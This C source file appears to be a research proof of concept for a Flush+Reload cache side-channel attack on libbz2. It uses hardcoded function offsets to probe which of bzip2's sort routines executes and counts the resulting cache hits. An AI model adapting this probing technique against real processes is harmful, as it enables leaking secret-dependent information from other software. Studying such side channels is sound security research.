#define BZ_IMPORT
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <sched.h>
#include <stdbool.h>
#include <x86intrin.h>
#include "bzlib.h"
#include "cacheutils.h"

#define NR_TRIES (10000)
unsigned char g_mainSort_hits[NR_TRIES] = {0};
unsigned char g_fallbackSort_hits[NR_TRIES] = {0};
unsigned int g_curr_idx = 0;
bool g_advance_iter = false;

// returns 1 if there was at least 1 hit
// returns -1 if too many tries
inline int check_addrs(unsigned char* p_mainSort, unsigned char* p_fallbackSort)
{
	if(g_curr_idx >= NR_TRIES) return -1;
	_mm_lfence();
	g_mainSort_hits[g_curr_idx] = flush_reload(p_mainSort);
	_mm_lfence();
	g_fallbackSort_hits[g_curr_idx] = flush_reload(p_fallbackSort);
	_mm_lfence();

	int res = 0;
	if(g_mainSort_hits[g_curr_idx] || g_fallbackSort_hits[g_curr_idx]) {
		res = 1;
	}
	if(g_advance_iter) {
		g_curr_idx ++;
	}
	return res;
}

void print_res()
{
	int mainSort_cnt = 0, fallbackSort_cnt = 0;
	for(int i = 0 ; i < NR_TRIES ; i ++) {
		if(g_mainSort_hits[i]) mainSort_cnt ++;
#if PRINT_RAW_DATA
		printf("%d ", g_mainSort_hits[i]);
#endif
	}
#if PRINT_RAW_DATA
	printf("\n");
#endif
	for(int i = 0 ; i < NR_TRIES ; i ++) {
		if(g_fallbackSort_hits[i]) fallbackSort_cnt ++;
#if PRINT_RAW_DATA
		printf("%d ", g_fallbackSort_hits[i]);
#endif
	}
#if PRINT_RAW_DATA
	printf("\n");
#endif
	printf("mainSort_cnt = %d\n", mainSort_cnt);
	printf("fallbackSort_cnt = %d\n", fallbackSort_cnt);
}

int main(int argc,char *argv[])
{
	char source[0x1000] = {0};
	char dest[0x1000] = {0};
	unsigned int destLen = 0x1000, sourceLen = 3;

	for(int i = 0 ; i < sourceLen ; i ++) {
		source[i] = 'a';
	}

	int res = BZ2_bzBuffToBuffCompress(dest, &destLen, source, sourceLen, 9, 0, 30);

	assert(res == BZ_OK);

/*
 * from: nm libbz2.so.1.0
 * 000000000000b700 t handle_compress.isra.0
 * 000000000000dfa0 T BZ2_bzBuffToBuffCompress 
 *
 * from the tool output:
 * handle_compress.isra.0+829 is 0x00007ffff7bd9a3d  33 04 8e             xor    (%rsi,%rcx,4)[4byte] %eax -> %eax
 *
 * 0x00007ffff7bd104f /home/mini/workspace/dynamoChannel/bzip2-1.0.6/libbz2.so.1.0.6!mainSort+207
 * 0x00007ffff7bd104f  83 04 8e 01          add    $0x00000001 (%rsi,%rcx,4)[4byte] -> (%rsi,%rcx,4)[4byte]
 *
 * from gdb:
 * (gdb) print BZ2_bzBuffToBuffCompress
 * $1 = {int (char *, unsigned int *, char *, unsigned int, int, int, int)} 0x7ffff7fbffa0 <BZ2_bzBuffToBuffCompress>
 * (gdb) print handle_compress
 * $2 = {Bool (bz_stream *, bz_stream *)} 0x7ffff7fbd700 <handle_compress>
 * (gdb) print/x handle_compress@10
 * $3 = {0x41, 0x54, 0x45, 0x31, 0xe4, 0x55, 0x31, 0xed, 0x53, 0x8b}
 * (gdb) print fallbackSort
 * $2 = {void (UInt32 *, UInt32 *, UInt32 *, Int32, Int32)} 0x7ffff7fb4390 <fallbackSort>
 * (gdb) print mainSort
 * $3 = {void (UInt32 *, UChar *, UInt16 *, UInt32 *, Int32, Int32, Int32 *)} 0x7ffff7fb4f80 <mainSort>
*/
	const unsigned long HANDLE_COMPRESS = 0x7ffff7fbaa30; // was 0x7ffff7fbd700;
	const unsigned long MAIN_SORT = 0x7ffff7fb2070; // was 0x7ffff7fb4f80;
	const unsigned long FALLBACK_SORT = 0x7ffff7fb1390; // was 0x7ffff7fb4390;
	const unsigned long BUF2BUF = 0x7ffff7fbd210; // was 0x7ffff7fbffa0;

	unsigned char* p_mainSort = (void*)BZ2_bzBuffToBuffCompress + MAIN_SORT - BUF2BUF + 207;
	unsigned char* p_fallbackSort = (void*)BZ2_bzBuffToBuffCompress + FALLBACK_SORT - BUF2BUF + 116;

#if 0
	printf("p_fallbackSort[0] = %02x\n", p_fallbackSort[0]);
	printf("p_fallbackSort[1] = %02x\n", p_fallbackSort[1]);
	printf("p_fallbackSort[2] = %02x\n", p_fallbackSort[2]);
	printf("p_fallbackSort[3] = %02x\n", p_fallbackSort[3]);
	printf("p_fallbackSort[4] = %02x\n", p_fallbackSort[4]);
#endif
	assert(p_mainSort[0] == 0x09);
	assert(p_mainSort[1] == 0xc8);
	assert(p_mainSort[2] == 0x48);
	assert(p_mainSort[3] == 0x63);
	assert(p_mainSort[4] == 0xc8);

	assert(p_fallbackSort[0] == 0x00);
	assert(p_fallbackSort[1] == 0x00);
	assert(p_fallbackSort[2] == 0x01);
	assert(p_fallbackSort[3] == 0x48);
	assert(p_fallbackSort[4] == 0x39);

	CACHE_MISS = detect_flush_reload_threshold();
	//CACHE_MISS = 200; // for some reason 200 works better
	//CACHE_MISS = 250; // for some reason 200 works better
	CACHE_MISS = 200; // for some reason 200 works better
	printf("CACHE_MISS = %d\n", CACHE_MISS);
	
	flush(p_mainSort);
	flush(p_fallbackSort);
	mfence();
	for(volatile int i = 0 ; i < 5000 ; i ++);
	mfence();

	while(!check_addrs(p_mainSort, p_fallbackSort));
	g_curr_idx ++;
	g_advance_iter = true;
	while(check_addrs(p_mainSort, p_fallbackSort) != -1);

	print_res();

	printf("got cache hit!\n");


	return 0;
}
